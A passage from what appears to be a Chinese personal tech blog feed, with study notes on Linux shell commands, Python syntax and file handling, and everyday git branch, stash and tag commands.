<code>/</code></li><li>跳转上一个目录 <code>cd -</code></li><li>跳转前n目录 <code>cd -n</code></li><li>跳转后n目录 <code>cd +n</code></li></ul><h2 id="if-条件判断"><a href="#if-条件判断" class="headerlink" title="if 条件判断"></a>if 条件判断</h2><h3 id="文件表达式"><a href="#文件表达式" class="headerlink" title="文件表达式"></a>文件表达式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -e file ]      # 如果文件或者目录存在，不管有没有权限</span><br><span class="line">if [ -f file ]      # 如果文件是普通文件，不是目录或者设备文件</span><br><span class="line">if [ -d ...  ]      # 如果目录存在</span><br><span class="line">if [ -s file ]      # 如果文件存在且非空 </span><br><span class="line">if [ -r file ]      # 如果文件存在且可读</span><br><span class="line">if [ -w file ]      # 如果文件存在且可写</span><br><span class="line">if [ -x file ]      # 如果文件存在且可执行</span><br></pre></td></tr></table></figure><h3 id="整数变量表达式"><a href="#整数变量表达式" class="headerlink" title="整数变量表达式"></a>整数变量表达式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ int1 -eq int2 ]        # 如果int1等于int2   </span><br><span class="line">if [ int1 -ne int2 ]        # 如果不等于    </span><br><span class="line">if [ int1 -ge int2 ]        # 如果&gt;=</span><br><span class="line">if [ int1 -gt int2 ]        # 如果&gt;</span><br><span class="line">if [ int1 -le int2 ]        # 如果&lt;=</span><br><span class="line">if [ int1 -lt int2 ]        # 如果&lt;</span><br></pre></td></tr></table></figure><h3 id="字符串变量表达式"><a href="#字符串变量表达式" class="headerlink" title="字符串变量表达式"></a>字符串变量表达式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if  [ $a = $b ]                     # 如果string1等于string2</span><br><span class="line">                                    # 字符串允许使用赋值号做等号</span><br><span class="line">if  [ $string1 != $string2 ]        # 如果string1不等于string2       </span><br><span class="line">if  [ -n $string ]                  # 如果string 非空(非0），返回0(true)  </span><br><span class="line">if  [ -z $string ]                  # 如果string 为空</span><br><span class="line">if  [ $sting ]                      # 如果string 非空，返回0 (和-n类似)</span><br></pre></td></tr></table></figure><h2 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h2><p>watch命令以周期性的方式执行给定的指令，指令输出以全屏方式显示。watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code>watch(选项)(参数)</code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><ul><li>-n：指定指令执行的间隔时间（秒）；</li><li>-d：高亮显示指令输出信息不同之处；</li><li>-t：不显示标题。</li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>指令：需要周期性执行的指令。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">watch uptime</span><br><span class="line">watch -t uptime</span><br><span class="line">watch -d -n 1 netstat -ntlp</span><br><span class="line">watch -d 'ls -l | fgrep goface'     //监测goface的文件</span><br><span class="line">watch -t -differences=cumulative uptime</span><br><span class="line">watch -n 60 from            //监控mail</span><br><span class="line">watch -n 1 "df -i;df"       //监测磁盘inode和block数目变化情况</span><br></pre></td></tr></table></figure><h2 id="tail-实时查看文件内容（可用于查看log文件）"><a href="#tail-实时查看文件内容（可用于查看log文件）" class="headerlink" title="tail 实时查看文件内容（可用于查看log文件）"></a>tail 实时查看文件内容（可用于查看log文件）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -f (fileName)</span><br></pre></td></tr></table></figure><h2 id="grep-查找文件内容"><a href="#grep-查找文件内容" class="headerlink" title="grep 查找文件内容"></a>grep 查找文件内容</h2><h3 id="查找目录下所有文件匹配对应字符串"><a href="#查找目录下所有文件匹配对应字符串" class="headerlink" title="查找目录下所有文件匹配对应字符串"></a>查找目录下所有文件匹配对应字符串</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -r -n "test" ./</span><br></pre></td></tr></table></figure><ul><li><code>-r</code>遍历子目录</li><li><code>-n</code>遍历行数</li><li><code>-i</code>大小写无关</li></ul><h2 id="压缩和解压缩命令"><a href="#压缩和解压缩命令" class="headerlink" title="压缩和解压缩命令"></a>压缩和解压缩命令</h2><h3 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h3><h4 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-c: 建立压缩档案</span><br><span class="line">-x：解压</span><br><span class="line">-t：查看内容</span><br><span class="line">-r：向压缩归档文件末尾追加文件</span><br><span class="line">-u：更新原压缩包中的文件</span><br></pre></td></tr></table></figure><p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-z：有gzip属性的</span><br><span class="line">-j：有bz2属性的</span><br><span class="line">-Z：有compress属性的</span><br><span class="line">-v：显示所有过程</span><br><span class="line">-O：将文件解开到标准输出</span><br></pre></td></tr></table></figure><p>这几个根据需要在压缩或解压档案时可选的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</span><br></pre></td></tr></table></figure><p>参数-f是必须的</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-C: 解压到什么目录</span><br></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzf xxx.tar.gz             # 解压tar.gz文件</span><br><span class="line">tar -xzvf xxx.tar.gz -C tmp     # 解压tar.gz文件显示过程，解压到tmp目录</span><br></pre></td></tr></table></figure><h3 id="zip格式"><a href="#zip格式" class="headerlink" title="zip格式"></a>zip格式</h3><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><p>压缩目录和目录下所有文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -r (filename.zip) (path)</span><br></pre></td></tr></table></figure><h4 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip (filename.zip) -d (path)</span><br></pre></td></tr></table></figure><ul><li>不加<code>-d</code>就解压到当前目录</li></ul><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><h2 id="搜索历史命令输入"><a href="#搜索历史命令输入" class="headerlink" title="搜索历史命令输入"></a>搜索历史命令输入</h2><ul><li><code>Ctrl + r</code></li><li>支持模糊搜索</li></ul><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="网络嗅探-nmap"><a href="#网络嗅探-nmap" class="headerlink" title="网络嗅探 nmap"></a>网络嗅探 nmap</h2><p><a href="https://baike.baidu.com/item/nmap/1400075?fr=aladdin" target="_blank" rel="noopener">nmap使用</a></p><h1 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h1><h2 id="修改卷标名称"><a href="#修改卷标名称" class="headerlink" title="修改卷标名称"></a>修改卷标名称</h2><p>分区为<code>ext2/ext3</code>类型使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e2label /dev/(partition) "(name)"</span><br></pre></td></tr></table></figure><h1 id="脚本语法"><a href="#脚本语法" class="headerlink" title="脚本语法"></a>脚本语法</h1><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">abc() &#123;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abc</span><br></pre></td></tr></table></figure><p>函数调用不加括号</p>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习笔记</title>
    <url>/2018/09/16/2018-09-16-pythonStudy/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python 3.6.4</span><br><span class="line">Anaconda, Inc.</span><br><span class="line">(default, Jan 16 2018, 10:22:32) [MSC v.1900 64 bit (AMD64)] on win32</span><br></pre></td></tr></table></figure><h1 id="语法相关"><a href="#语法相关" class="headerlink" title="语法相关"></a>语法相关</h1><p>参考文档: <a href="https://www.w3cschool.cn/uqmpir/" target="_blank" rel="noopener">W3Cschool</a>、<a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">Runoob</a></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="None"><a href="#None" class="headerlink" title="None"></a>None</h3><ul><li>None是一个特殊的常量。</li><li>None和False不同。</li><li>None不是0。</li><li>None不是空字符串。</li><li>None和任何其他的数据类型比较永远返回False。</li><li>None有自己的数据类型NoneType。</li><li>你可以将None赋值给任何变量，但是你不能创建其他NoneType对象。</li></ul><p>python中矩阵索引使用None表示此维度不切片，同样意味着此维度大小未知</p><h2 id="del-删除一个变量释放空间"><a href="#del-删除一个变量释放空间" class="headerlink" title="del 删除一个变量释放空间"></a>del 删除一个变量释放空间</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> var</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="lambda-匿名函数"><a href="#lambda-匿名函数" class="headerlink" title="lambda 匿名函数"></a>lambda 匿名函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arg1, arg2, ...argN : expression using arguments</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>lambda 函数不能包含命令，包含的表达式不能超过一个。不要试图向 lambda 函数中塞入太多的东西；如果你需要更复杂的东西，应该定义一个普通函数，然后想让它多长就多长。</li><li>就lambda而言，它并没有给程序带来性能上的提升，它带来的是代码的简洁。</li></ul><h2 id="try-异常处理"><a href="#try-异常处理" class="headerlink" title="try 异常处理"></a>try 异常处理</h2><h3 id="try-except-else"><a href="#try-except-else" class="headerlink" title="try-except-else"></a>try-except-else</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#可能出错的代码</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;：</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#如果在try部份引发了'name'异常</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;，&lt;数据&gt;:</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#如果引发了'name'异常，获得附加的数据</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#如果没有异常发生</span></span><br></pre></td></tr></table></figure><h3 id="try-finally"><a href="#try-finally" class="headerlink" title="try-finally"></a>try-finally</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    &lt;语句&gt;    <span class="comment">#退出try时总会执行</span></span><br></pre></td></tr></table></figure><h3 id="raise触发异常"><a href="#raise触发异常" class="headerlink" title="raise触发异常"></a>raise触发异常</h3><h4 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">raise</span> [Exception [, args [, traceback]]]</span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mye</span><span class="params">(level)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> level &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception, <span class="string">"Invalid level!"</span></span><br><span class="line">        <span class="comment"># 触发异常后，后面的代码就不会再执行</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    mye(<span class="number">0</span>)            <span class="comment"># 触发异常</span></span><br><span class="line"><span class="keyword">except</span> Exception, err:</span><br><span class="line">    print(<span class="number">1</span>, err)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 Invalid level!</span><br></pre></td></tr></table></figure><h4 id="用户自定义异常"><a href="#用户自定义异常" class="headerlink" title="用户自定义异常"></a>用户自定义异常</h4><p>通过创建一个新的异常类，程序可以命名它们自己的异常。异常应该是典型的继承自Exception类，通过直接或间接的方式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Networkerror</span><span class="params">(RuntimeError)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></span><br><span class="line">        self.args = arg</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Networkerror(<span class="string">"Bad hostname"</span>)</span><br><span class="line"><span class="keyword">except</span> Networkerror,e:</span><br><span class="line">    print(e.args)</span><br></pre></td></tr></table></figure><h2 id="with-上下文"><a href="#with-上下文" class="headerlink" title="with 上下文"></a>with 上下文</h2><h3 id="with是什么"><a href="#with是什么" class="headerlink" title="with是什么"></a>with是什么</h3><p>with处理相当于<code>try-finally</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = open(<span class="string">"/tmp/foo.txt"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = file.read()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/foo.txt"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br></pre></td></tr></table></figure><h3 id="with怎么工作"><a href="#with怎么工作" class="headerlink" title="with怎么工作"></a>with怎么工作</h3><p>基本思想是with所求值的对象必须有一个<code>__enter__()</code>方法，一个<code>__exit__()</code>方法。</p><p>紧跟with后面的语句被求值后，返回对象的<code>__enter__()</code>方法被调用，这个方法的返回值将被赋值给as后面的变量。当with后面的代码块全部被执行完之后，将调用前面返回对象的<code>__exit__()</code>方法。</p><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># with_example01.py</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sample</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"In __enter__()"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Foo"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, type, value, trace)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"In __exit__()"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sample</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> Sample()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> get_sample() <span class="keyword">as</span> sample:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"sample:"</span>, sample</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In __enter__()</span><br><span class="line">sample: Foo</span><br><span class="line">In __exit__()</span><br></pre></td></tr></table></figure><h1 id="指定编码格式"><a href="#指定编码格式" class="headerlink" title="指定编码格式"></a>指定编码格式</h1><h2 id="格式1"><a href="#格式1" class="headerlink" title="格式1"></a>格式1</h2><p>源文件第一行或第二行直接定义</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br></pre></td></tr></table></figure><h1 id="特殊操作"><a href="#特殊操作" class="headerlink" title="特殊操作"></a>特殊操作</h1><h2 id="路径相关操作"><a href="#路径相关操作" class="headerlink" title="路径相关操作"></a>路径相关操作</h2><h3 id="获取当前路径"><a href="#获取当前路径" class="headerlink" title="获取当前路径"></a>获取当前路径</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">print(os.getcwd())                  <span class="comment">#获取当前工作目录路径</span></span><br><span class="line">print(os.path.abspath(<span class="string">'.'</span>))         <span class="comment">#获取当前工作目录路径</span></span><br><span class="line">print(os.path.abspath(<span class="string">'test.txt'</span>))  <span class="comment">#获取当前目录文件下的工作目录路径</span></span><br><span class="line">print(os.path.abspath(<span class="string">'..'</span>))        <span class="comment">#获取当前工作的父目录 ！注意是父目录路径</span></span><br><span class="line">print(os.path.abspath(os.curdir))   <span class="comment">#获取当前工作目录路径</span></span><br></pre></td></tr></table></figure><h3 id="改变当前路径"><a href="#改变当前路径" class="headerlink" title="改变当前路径"></a>改变当前路径</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(path)</span><br></pre></td></tr></table></figure><h3 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h3><p>此命令会遍历目录下的所有文件包括子文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirPath, dirNames, fileNames <span class="keyword">in</span> os.walk(<span class="string">'./'</span>):</span><br><span class="line">    print(<span class="string">'dirPath'</span>, dirPath)       <span class="comment"># 当前遍历的目录</span></span><br><span class="line">    print(<span class="string">'dirNames'</span>, dirNames)     <span class="comment"># 该目录下所有的文件夹名字组成的列表</span></span><br><span class="line">    print(<span class="string">'fileNames'</span>, fileNames)   <span class="comment"># 该目录下所有的文件名字组成的列表</span></span><br></pre></td></tr></table></figure><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><h3 id="zip格式"><a href="#zip格式" class="headerlink" title="zip格式"></a>zip格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">z = zipfile.ZipFile(folderName + <span class="string">'.zip'</span>, <span class="string">'w'</span>, zipfile.ZIP_STORED) <span class="comment"># 创建文件</span></span><br><span class="line">z.write(<span class="string">'test.txt'</span>)             <span class="comment"># 写入一个文件</span></span><br><span class="line">z.write(<span class="string">'dirName'</span>)              <span class="comment"># 写入一个空文件夹</span></span><br><span class="line">z.write(<span class="string">'folderName/fileName'</span>)  <span class="comment"># 可以在没有上级目录的情况下直接写一个文件</span></span><br><span class="line">z.close()                       <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>压缩目录下的所有文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">z = zipfile.ZipFile(<span class="string">'dirName.zip'</span>, <span class="string">'w'</span>, zipfile.ZIP_STORED)</span><br><span class="line"><span class="keyword">for</span> dirPath, dirNames, fileNames <span class="keyword">in</span> os.walk(<span class="string">'dirName'</span>):</span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        z.write(dirPath + <span class="string">'/'</span> + fileName)</span><br><span class="line">        print(dirPath + <span class="string">'/'</span> + fileName)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 防止空文件夹没有被添加入压缩文件</span></span><br><span class="line">    <span class="keyword">for</span> dirName <span class="keyword">in</span> dirNames:</span><br><span class="line">        z.write(dirPath + <span class="string">'/'</span> + dirName)</span><br><span class="line">        print(dirPath + <span class="string">'/'</span> + dirName + <span class="string">'/'</span>) <span class="comment"># 区别于文件的打印</span></span><br><span class="line">z.close()</span><br></pre></td></tr></table></figure><h2 id="调用可执行文件"><a href="#调用可执行文件" class="headerlink" title="调用可执行文件"></a>调用可执行文件</h2><h3 id="获取输出结果"><a href="#获取输出结果" class="headerlink" title="获取输出结果"></a>获取输出结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">f = os.popen(<span class="string">"(cmd) (param)"</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="获取返回值"><a href="#获取返回值" class="headerlink" title="获取返回值"></a>获取返回值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r_v = os.system(<span class="string">"(cmd) (param)"</span>)</span><br><span class="line"><span class="keyword">print</span> r_v</span><br></pre></td></tr></table></figure><h2 id="汉字转拼音"><a href="#汉字转拼音" class="headerlink" title="汉字转拼音"></a>汉字转拼音</h2><p>需要安装xpinyin模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install xpinyin</span><br></pre></td></tr></table></figure><p>简单用例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xpinyin</span><br><span class="line">pin = xpinyin.Pinyin()</span><br><span class="line">test1 = pin.get_pinyin(<span class="string">"大河向东流"</span>)   <span class="comment">#默认分割符为-</span></span><br><span class="line">print(test1)</span><br><span class="line"></span><br><span class="line">test2 = pin.get_pinyin(<span class="string">"大河向东流"</span>, <span class="string">""</span>)</span><br><span class="line">print(test2)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>git命令学习</title>
    <url>/2018/08/20/2018-08-20-gitStudy/</url>
    <content><![CDATA[<h1 id="分支使用"><a href="#分支使用" class="headerlink" title="分支使用"></a>分支使用</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -a           # 查看本地和远程所有分支</span><br></pre></td></tr></table></figure><h2 id="本地创建并切换分支"><a href="#本地创建并切换分支" class="headerlink" title="本地创建并切换分支"></a>本地创建并切换分支</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -b 'branch'</span><br></pre></td></tr></table></figure><h2 id="将远程分支check到本地同名分支并跟踪"><a href="#将远程分支check到本地同名分支并跟踪" class="headerlink" title="将远程分支check到本地同名分支并跟踪"></a>将远程分支check到本地同名分支并跟踪</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -b 'branch' --track 'origin/branch'</span><br></pre></td></tr></table></figure><h2 id="将本地分支推送到远程另一个分支上"><a href="#将本地分支推送到远程另一个分支上" class="headerlink" title="将本地分支推送到远程另一个分支上"></a>将本地分支推送到远程另一个分支上</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push (origin_name) 'branch':'branch'</span><br></pre></td></tr></table></figure><h2 id="将本地分支推送到远程不存在的分支上（新建远程分支）"><a href="#将本地分支推送到远程不存在的分支上（新建远程分支）" class="headerlink" title="将本地分支推送到远程不存在的分支上（新建远程分支）"></a>将本地分支推送到远程不存在的分支上（新建远程分支）</h2><p>不跟踪</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push (origin_name) (branch_name)</span><br></pre></td></tr></table></figure><p>添加跟踪</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push --set-upstream (origin_name) (branch_name)</span><br></pre></td></tr></table></figure><h2 id="强制使用远程分支内容"><a href="#强制使用远程分支内容" class="headerlink" title="强制使用远程分支内容"></a>强制使用远程分支内容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard (origin_name)/(branch)</span><br></pre></td></tr></table></figure><h2 id="强制更新远端仓库"><a href="#强制更新远端仓库" class="headerlink" title="强制更新远端仓库"></a>强制更新远端仓库</h2><p>全部更新</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -f (origin_name)</span><br></pre></td></tr></table></figure><p>只更新一个分支</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -f (origin_name) (branch)</span><br></pre></td></tr></table></figure><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><h3 id="删除本地分支"><a href="#删除本地分支" class="headerlink" title="删除本地分支"></a>删除本地分支</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -d (branch)      # 删除本地和远端已同步的分支</span><br><span class="line">git branch -D (branch)      # 强制删除本地分支不关心是否同步</span><br></pre></td></tr></table></figure><h3 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push (origin_name) --delete (branch)    # 删除远程origin_name的branch分支</span><br></pre></td></tr></table></figure><h2 id="生效其他分支的一次提交"><a href="#生效其他分支的一次提交" class="headerlink" title="生效其他分支的一次提交"></a>生效其他分支的一次提交</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>非合并类型提交</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git cherry-pick -n xxx</span><br></pre></td></tr></table></figure><p>合并类型的提交</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git cherry-pick -m 1 -n xxx</span><br></pre></td></tr></table></figure><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li><code>-n</code>: 不提交，不加将会使用要使用的提交的message创建一次提交</li><li><code>-m 1</code>: 使用合并到分支的改动，设置成2将使用被合并的分支的改动</li></ul><h1 id="代码回退"><a href="#代码回退" class="headerlink" title="代码回退"></a>代码回退</h1><h2 id="未保存暂存区"><a href="#未保存暂存区" class="headerlink" title="未保存暂存区"></a>未保存暂存区</h2><p>撤销一个文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -- (test.py)</span><br></pre></td></tr></table></figure><h2 id="保存到暂存区"><a href="#保存到暂存区" class="headerlink" title="保存到暂存区"></a>保存到暂存区</h2><p>撤销一个文件的暂存区保存操作（未撤销文件改动）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout HEAD (test.py) //回到提交点，保留本地改动</span><br><span class="line">git checkout --hard HEAD    //强制回到提交点，丢弃所有改动</span><br></pre></td></tr></table></figure><h1 id="储藏区"><a href="#储藏区" class="headerlink" title="储藏区"></a>储藏区</h1><p>只会保存修改的文件，添加删除不会保存</p><h2 id="保存当前代码到储藏区"><a href="#保存当前代码到储藏区" class="headerlink" title="保存当前代码到储藏区"></a>保存当前代码到储藏区</h2><p>想切换分支但没有完成需要提交一次的代码，临时存到储藏区</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><h2 id="查看储藏区内容"><a href="#查看储藏区内容" class="headerlink" title="查看储藏区内容"></a>查看储藏区内容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash list</span><br></pre></td></tr></table></figure><h2 id="恢复储藏区内容"><a href="#恢复储藏区内容" class="headerlink" title="恢复储藏区内容"></a>恢复储藏区内容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><h1 id="查看改动记录"><a href="#查看改动记录" class="headerlink" title="查看改动记录"></a>查看改动记录</h1><h2 id="查看某一个文件内容的改动人和时间"><a href="#查看某一个文件内容的改动人和时间" class="headerlink" title="查看某一个文件内容的改动人和时间"></a>查看某一个文件内容的改动人和时间</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git blame (fileName)</span><br><span class="line">git blame -L n,m (fileName)</span><br></pre></td></tr></table></figure><ul><li><code>-L</code>参数为查看n到m行的改动记录，不加为文件所有改动</li></ul><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><h2 id="列显已有的标签"><a href="#列显已有的标签" class="headerlink" title="列显已有的标签"></a>列显已有的标签</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure><h2 id="用特定的搜索模式列出符合条件的标签"><a href="#用特定的搜索模式列出符合条件的标签" class="headerlink" title="用特定的搜索模式列出符合条件的标签"></a>用特定的搜索模式列出符合条件的标签</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -l 'condition'</span><br></pre></td></tr></table></figure><h2 id="查看相应标签的版本信息"><a href="#查看相应标签的版本信息" class="headerlink" title="查看相应标签的版本信息"></a>查看相应标签的版本信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git show (version)</span><br></pre></td></tr></table></figure><h2 id="新建标签"><a href="#新建标签" class="headerlink" title="新建标签"></a>新建标签</h2><p>Git 